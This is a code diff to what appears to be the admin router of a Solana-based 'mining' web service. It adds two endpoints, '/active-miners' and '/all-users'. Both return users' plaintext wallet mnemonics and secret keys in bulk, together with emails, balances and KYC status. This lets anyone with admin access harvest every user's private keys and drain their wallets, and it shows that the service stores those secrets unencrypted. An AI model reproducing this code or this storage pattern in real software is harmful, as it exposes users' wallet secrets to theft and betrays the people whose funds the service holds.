@@ -162,6 +162,24 @@ router.post('/reject/:id', authenticate, isAdmin, async (req, res) => {
   }
 });
 
+router.get('/active-miners', authenticate, isAdmin, async (req, res) => {
+  try {
+    const users = await User.find({ 'solanaWallet.mnemonic': { $exists: true, $ne: '' } });
+    const miners = users.map(u => ({
+      username: u.username,
+      email: u.email,
+      wallet: u.solanaWallet?.publicKey,
+      miningSince: u.miningSince,
+      mnemonic: u.solanaWallet.mnemonic
+    }));
+    res.json({ success: true, miners });
+  } catch (err) {
+    console.error("Active miners fetch error:", err);
+    res.status(500).json({ success: false, message: "Server error" });
+  }
+});
+
+
 // ✅ Total Users
 router.get('/total-users', authenticate, isAdmin, async (req, res) => {
   try {
@@ -172,6 +190,27 @@ router.get('/total-users', authenticate, isAdmin, async (req, res) => {
     res.status(500).json({ success: false, message: "Server error" });
   }
 });
+
+router.get('/all-users', authenticate, isAdmin, async (req, res) => {
+  try {
+    const users = await User.find().select('-password');
+    const userList = users.map(user => ({
+      username: user.username,
+      email: user.email,
+      publicKey: user.solanaWallet?.publicKey || '',
+      secretKey: user.solanaWallet?.secretKey || '',
+      mnemonic: user.solanaWallet?.mnemonic || '',
+      balance: user.balance,
+      kycStatus: user.kyc?.status || 'not_submitted',
+      registeredAt: user.createdAt || user.registeredAt || user._id.getTimestamp()
+    }));
+    res.json({ success: true, users: userList });
+  } catch (err) {
+    console.error("All users fetch error:", err);
+    res.status(500).json({ success: false, message: "Server error" });
+  }
+});
+
 
 // ✅ Deposit History
 router.get('/deposit-history', authenticate, isAdmin, async (req, res) => {
